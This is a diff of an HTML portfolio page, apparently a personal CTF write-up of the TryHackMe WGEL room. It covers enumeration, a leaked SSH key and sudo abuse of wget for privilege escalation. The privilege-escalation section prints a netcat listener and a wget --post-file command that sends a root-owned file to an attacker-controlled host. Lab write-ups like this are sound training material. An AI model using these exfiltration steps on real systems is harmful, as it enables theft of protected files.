@@ -2,207 +2,172 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>WGE LCTF | TryHackMe Writeup</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html {
-      scroll-behavior: smooth;
-    }
-    body {
-      background-color: #0d0d0d;
-      color: #b9fbc0;
-      font-family: 'Courier New', monospace;
-      padding: 2em;
-      max-width: 900px;
-      margin: auto;
-    }
-    h1, h2 {
-      color: #00f5d4;
-    }
-    h3 {
-      color: #ff4ecd;
-    }
-    a {
-      color: #85f4ff;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    img {
-      width: 100%;
-      border: 2px solid #333;
-      border-radius: 8px;
-      margin: 1.5em 0;
-    }
-    code {
-      background-color: #1a1a1a;
-      padding: 2px 6px;
-      border-radius: 4px;
-      color: #00ff88;
-    }
-    pre {
-      background-color: #111;
-      padding: 12px;
-      overflow-x: auto;
-      border-left: 4px solid #00d9ff;
-      border-radius: 6px;
-    }
-    .section {
-      margin-bottom: 3em;
-    }
-    .sidebar {
-      position: fixed;
-      top: 100px;
-      left: 20px;
-      width: 160px;
-      background: rgba(20, 20, 40, 0.85);
-      border: 1px solid #00f5d4;
-      padding: 1em;
-      border-radius: 10px;
-      font-size: 0.9em;
-      z-index: 999;
-    }
-    .sidebar h3 {
-      color: #00f5d4;
-      font-size: 1.1em;
-      margin-bottom: 0.6em;
-      text-align: center;
-    }
-    .sidebar ul {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-    }
-    .sidebar li {
-      margin-bottom: 0.6em;
-    }
-    .sidebar a {
-      color: #b9fbc0;
-      text-decoration: none;
-    }
-    .sidebar a:hover {
-      color: #ff4ecd;
-      text-shadow: 0 0 5px #ff4ecd;
-    }
-    @media (max-width: 1000px) {
-      .sidebar {
-        display: none;
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>WGE LCTF | TryHackMe Write‑up</title>
+  <!-- Tailwind (same theme as index) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            base: {900:'#0a0f14',800:'#0f1720',700:'#111827'},
+            neon: {400:'#33ff99',500:'#22ffaa'}
+          },
+          boxShadow: {
+            glow: '0 0 0 2px rgba(51,255,153,0.15), 0 0 24px rgba(51,255,153,0.20)'
+          },
+          fontFamily: {
+            display: ['Inter','system-ui','Segoe UI','Helvetica Neue','Arial','sans-serif']
+          }
+        }
       }
     }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    .active-tab{color:#33ff99}
   </style>
 </head>
-<body>
-  <div class="sidebar">
-    <h3>☰ Quick Nav</h3>
-    <ul>
-      <li><a href="#recon">🔎 Recon</a></li>
-      <li><a href="#apache">🌐 Apache</a></li>
-      <li><a href="#sitemap">📂 /sitemap</a></li>
-      <li><a href="#gobuster">🛠️ Gobuster</a></li>
-      <li><a href="#comment">👀 Comment</a></li>
-      <li><a href="#ssh">🔑 SSH Key</a></li>
-      <li><a href="#login">🔐 SSH Login</a></li>
-      <li><a href="#sudo">🧪 Sudo Priv</a></li>
-      <li><a href="#userflag">📜 User Flag</a></li>
-      <li><a href="#privesc">⚡ PrivEsc</a></li>
-      <li><a href="#rootflag">🏋 Root Flag</a></li>
-      <li><a href="#summary">✅ Summary</a></li>
-    </ul>
-  </div>
+<body class="bg-base-900 text-slate-200 font-display">
+  <!-- Top Nav (tabs like other pages) -->
+  <header class="sticky top-0 z-50 backdrop-blur bg-base-900/70 border-b border-white/5">
+    <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
+      <a href="index.html" class="text-2xl font-extrabold tracking-tight">OMAR<span class="text-neon-400">.</span></a>
+      <nav class="hidden md:flex items-center gap-6 text-sm">
+        <a href="index.html" class="hover:text-neon-400">Home</a>
+        <a href="writeups.html" class="hover:text-neon-400 active-tab">Write‑ups</a>
+        <a href="socials.html" class="hover:text-neon-400">Socials</a>
+        <a href="Omar_Tamer_Resume.pdf" class="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10">Download Resume</a>
+      </nav>
+    </div>
+  </header>
 
-<h1>🚩 TryHackMe – WGEL CTF Writeup</h1>
-<p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGEL CTF</a></p>
+  <div class="max-w-6xl mx-auto px-4">
+    <!-- Sidebar (matches your original quick nav, hidden on smaller screens) -->
+    <aside class="hidden lg:block fixed top-28 left-6 w-52 bg-base-800/90 border border-neon-400/60 rounded-2xl p-4 text-sm">
+      <h3 class="text-neon-400 font-semibold text-center">☰ Quick Nav</h3>
+      <ul class="mt-3 space-y-2">
+        <li><a class="hover:text-neon-400" href="#recon">🔎 Recon</a></li>
+        <li><a class="hover:text-neon-400" href="#apache">🌐 Apache</a></li>
+        <li><a class="hover:text-neon-400" href="#sitemap">📂 /sitemap</a></li>
+        <li><a class="hover:text-neon-400" href="#gobuster">🛠️ Gobuster</a></li>
+        <li><a class="hover:text-neon-400" href="#comment">👀 Comment</a></li>
+        <li><a class="hover:text-neon-400" href="#ssh">🔑 SSH Key</a></li>
+        <li><a class="hover:text-neon-400" href="#login">🔐 SSH Login</a></li>
+        <li><a class="hover:text-neon-400" href="#sudo">🧪 Sudo Priv</a></li>
+        <li><a class="hover:text-neon-400" href="#userflag">📜 User Flag</a></li>
+        <li><a class="hover:text-neon-400" href="#privesc">⚡ PrivEsc</a></li>
+        <li><a class="hover:text-neon-400" href="#rootflag">🏋 Root Flag</a></li>
+        <li><a class="hover:text-neon-400" href="#summary">✅ Summary</a></li>
+      </ul>
+    </aside>
 
-<div class="section" id="video">
-  <h2>📺 Full Video Walkthrough</h2>
-  <div style="text-align: center; margin-bottom: 30px;">
-    <iframe width="700" height="394" src="https://www.youtube.com/embed/HJ71nuCv8Wo"
-      title="WGEL TryHackMe Walkthrough" frameborder="0"
-      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
-      allowfullscreen>
-    </iframe>
-  </div>
-</div>
+    <!-- Main content -->
+    <main class="mx-auto lg:ml-64 max-w-3xl py-10">
+      <h1 class="text-4xl font-extrabold">🚩 TryHackMe – WGEL CTF Write‑up</h1>
+      <p class="mt-2 text-slate-300"><strong>Room:</strong> <a class="text-neon-400 hover:underline" href="https://tryhackme.com/room/wgelctf" target="_blank">WGEL CTF</a></p>
 
+      <!-- Video -->
+      <section id="video" class="mt-8">
+        <h2 class="text-2xl font-bold">📺 Full Video Walkthrough</h2>
+        <div class="mt-4 rounded-2xl overflow-hidden border border-white/10 bg-base-800 aspect-video">
+          <iframe class="w-full h-full" src="https://www.youtube.com/embed/HJ71nuCv8Wo" title="WGEL TryHackMe Walkthrough" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+        </div>
+      </section>
 
-  <div class="section" id="recon">
-    <h2>🔎 Initial Recon</h2>
-    <p>I launched an Nmap scan to check for open ports and services running on the target. This helps form the attack surface. In this case, ports 22 (SSH) and 80 (HTTP) were discovered.</p>
-    <img src="assets/img/wgel/scan.png" alt="Nmap Scan">
-  </div>
+      <!-- Sections from your original content, themed -->
+      <section id="recon" class="section mt-10">
+        <h2 class="text-2xl font-bold">🔎 Initial Recon</h2>
+        <p class="mt-2 text-slate-300">I launched an Nmap scan to check for open ports and services running on the target. This helps form the attack surface. In this case, ports 22 (SSH) and 80 (HTTP) were discovered.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/scan.png" alt="Nmap Scan">
+      </section>
 
-  <div class="section" id="apache">
-    <h2>🌐 Apache Default Page</h2>
-    <p>I browsed to the target's IP in a web browser and saw the default Apache2 Debian page. This usually means there's no custom web app at the root, but it's confirmation the web server is up.</p>
-    <img src="assets/img/wgel/apache-server.png" alt="Apache Default">
-  </div>
+      <section id="apache" class="mt-10">
+        <h2 class="text-2xl font-bold">🌐 Apache Default Page</h2>
+        <p class="mt-2 text-slate-300">I browsed to the target's IP in a web browser and saw the default Apache2 Debian page. This usually means there's no custom web app at the root, but it's confirmation the web server is up.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/apache-server.png" alt="Apache Default">
+      </section>
 
-  <div class="section" id="sitemap">
-    <h2>📂 /sitemap Discovery</h2>
-    <p>From browsing around or inspecting links/code, I found the /sitemap path, which can contain links or files not meant to be directly accessible. This is a good place to dig further.</p>
-    <img src="assets/img/wgel/sitemap-found.png" alt="Sitemap Discovery">
-  </div>
+      <section id="sitemap" class="mt-10">
+        <h2 class="text-2xl font-bold">📂 /sitemap Discovery</h2>
+        <p class="mt-2 text-slate-300">From browsing around or inspecting links/code, I found the /sitemap path, which can contain links or files not meant to be directly accessible. This is a good place to dig further.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/sitemap-found.png" alt="Sitemap Discovery">
+      </section>
 
-  <div class="section" id="gobuster">
-    <h2>🛠️ Gobuster Enumeration</h2>
-    <p>I ran Gobuster to brute-force directories and files under /sitemap. This revealed additional hidden resources and confirmed that directory indexing was possible on the server.</p>
-    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster Found">
-    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Sitemap Gobuster">
-  </div>
+      <section id="gobuster" class="mt-10">
+        <h2 class="text-2xl font-bold">🛠️ Gobuster Enumeration</h2>
+        <p class="mt-2 text-slate-300">I ran Gobuster to brute-force directories and files under /sitemap. This revealed additional hidden resources and confirmed that directory indexing was possible on the server.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/gobuster-found.png" alt="Gobuster Found">
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/sitemap-gobuster.png" alt="Sitemap Gobuster">
+      </section>
 
-  <div class="section" id="comment">
-    <h2>👀 Developer Comment</h2>
-    <p>While viewing page source, I found a comment that hinted at incomplete development: "Jessie don't forget to update the website." Comments like these may lead to usernames or dev clues.</p>
-    <img src="assets/img/wgel/source-code.png" alt="Developer Comment">
-  </div>
+      <section id="comment" class="mt-10">
+        <h2 class="text-2xl font-bold">👀 Developer Comment</h2>
+        <p class="mt-2 text-slate-300">While viewing page source, I found a comment that hinted at incomplete development: "Jessie don't forget to update the website." Comments like these may lead to usernames or dev clues.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/source-code.png" alt="Developer Comment">
+      </section>
 
-  <div class="section" id="ssh">
-    <h2>🔑 SSH Key Disclosure</h2>
-    <p>While exploring the sitemap or directories revealed by Gobuster, I found a private SSH key left exposed. This is a critical misconfiguration as it allows remote access if the user is known.</p>
-    <img src="assets/img/wgel/ssh-found.png" alt="SSH Key Found">
-  </div>
+      <section id="ssh" class="mt-10">
+        <h2 class="text-2xl font-bold">🔑 SSH Key Disclosure</h2>
+        <p class="mt-2 text-slate-300">While exploring the sitemap or directories revealed by Gobuster, I found a private SSH key left exposed. This is a critical misconfiguration as it allows remote access if the user is known.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/ssh-found.png" alt="SSH Key Found">
+      </section>
 
-  <div class="section" id="login">
-    <h2>🔐 SSH Login</h2>
-    <p>With the private key and known user (from the comment), I attempted an SSH connection. It succeeded, giving me shell access as user Jessie — the first step to deeper enumeration.</p>
-    <img src="assets/img/wgel/ssh-login.png" alt="SSH Login">
-  </div>
+      <section id="login" class="mt-10">
+        <h2 class="text-2xl font-bold">🔐 SSH Login</h2>
+        <p class="mt-2 text-slate-300">With the private key and known user (from the comment), I attempted an SSH connection. It succeeded, giving me shell access as user Jessie — the first step to deeper enumeration.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/ssh-login.png" alt="SSH Login">
+      </section>
 
-  <div class="section" id="sudo">
-    <h2>🧪 Sudo Privileges</h2>
-    <p>Running <code>sudo -l</code> listed that Jessie could run <code>wget</code> as root without a password. This is an opportunity for privilege escalation by abusing wget functionality.</p>
-    <img src="assets/img/wgel/sudo-l.png" alt="Sudo Permissions">
-  </div>
+      <section id="sudo" class="mt-10">
+        <h2 class="text-2xl font-bold">🧪 Sudo Privileges</h2>
+        <p class="mt-2 text-slate-300">Running <code class="bg-base-800 px-1 rounded">sudo -l</code> listed that Jessie could run <code class="bg-base-800 px-1 rounded">wget</code> as root without a password. This is an opportunity for privilege escalation by abusing wget functionality.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/sudo-l.png" alt="Sudo Permissions">
+      </section>
 
-  <div class="section" id="userflag">
-    <h2>📜 User Flag</h2>
-    <p>From the Jessie user's home directory, I retrieved the user flag — usually stored in a file like <code>user_flag.txt</code>. This confirmed foothold on the box.</p>
-    <img src="assets/img/wgel/userflag.txt.png" alt="User Flag">
-  </div>
+      <section id="userflag" class="mt-10">
+        <h2 class="text-2xl font-bold">📜 User Flag</h2>
+        <p class="mt-2 text-slate-300">From the Jessie user's home directory, I retrieved the user flag — usually stored in a file like <code class="bg-base-800 px-1 rounded">user_flag.txt</code>. This confirmed foothold on the box.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/userflag.txt.png" alt="User Flag">
+      </section>
 
-  <div class="section" id="privesc">
-    <h2>⚡ Privilege Escalation via wget</h2>
-    <p>I tried GTFOBins’ reverse shell payload for wget but it didn’t work. Instead, I used <code>--post-file</code> to send the root flag file to my own listener via HTTP — a neat manual exfiltration trick.</p>
-    <img src="assets/img/wgel/wget-vuln.png" alt="wget PrivEsc">
-    <pre><code># Attacker:
+      <section id="privesc" class="mt-10">
+        <h2 class="text-2xl font-bold">⚡ Privilege Escalation via wget</h2>
+        <p class="mt-2 text-slate-300">I tried GTFOBins’ reverse shell payload for wget but it didn’t work. Instead, I used <code class="bg-base-800 px-1 rounded">--post-file</code> to send the root flag file to my own listener via HTTP — a neat manual exfiltration trick.</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/wget-vuln.png" alt="wget PrivEsc">
+        <pre class="mt-4 bg-base-800 text-slate-200 p-4 rounded-xl border border-white/10 overflow-x-auto"><code># Attacker:
 nc -lvnp 80
 
 # Victim:
 sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
+      </section>
+
+      <section id="rootflag" class="mt-10">
+        <h2 class="text-2xl font-bold">🏋 Root Flag</h2>
+        <p class="mt-2 text-slate-300">Once I received the posted file on my netcat listener, I confirmed it contained the root flag. Game over — root owned!</p>
+        <img class="w-full rounded-xl border border-white/10 mt-4" src="assets/img/wgel/rootflag.png" alt="Root Flag">
+      </section>
+
+      <section id="summary" class="mt-10">
+        <h2 class="text-2xl font-bold">✅ Summary</h2>
+        <p class="mt-2 text-slate-300">This box involved classic web enumeration, a dev leak, and exploiting a badly configured sudo binary. I gained foothold via SSH key and escalated to root using a smart wget trick.</p>
+      </section>
+
+      <div class="mt-12">
+        <a href="writeups.html" class="text-neon-400 hover:underline">← Back to Write‑ups</a>
+      </div>
+    </main>
   </div>
 
-  <div class="section" id="rootflag">
-    <h2>🏋 Root Flag</h2>
-    <p>Once I received the posted file on my netcat listener, I confirmed it contained the root flag. Game over — root owned!</p>
-    <img src="assets/img/wgel/rootflag.png" alt="Root Flag">
-  </div>
-
-  <div class="section" id="summary">
-    <h2>✅ Summary</h2>
-    <p>This box involved classic web enumeration, a dev leak, and exploiting a badly configured sudo binary. I gained foothold via SSH key and escalated to root using a smart wget trick.</p>
-  </div>
-
+  <footer class="mt-12 border-t border-white/5 py-6 text-center text-sm text-slate-400">
+    © <span id="year"></span> Omar Tamer. All rights reserved.
+  </footer>
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
 </body>
 </html>
 
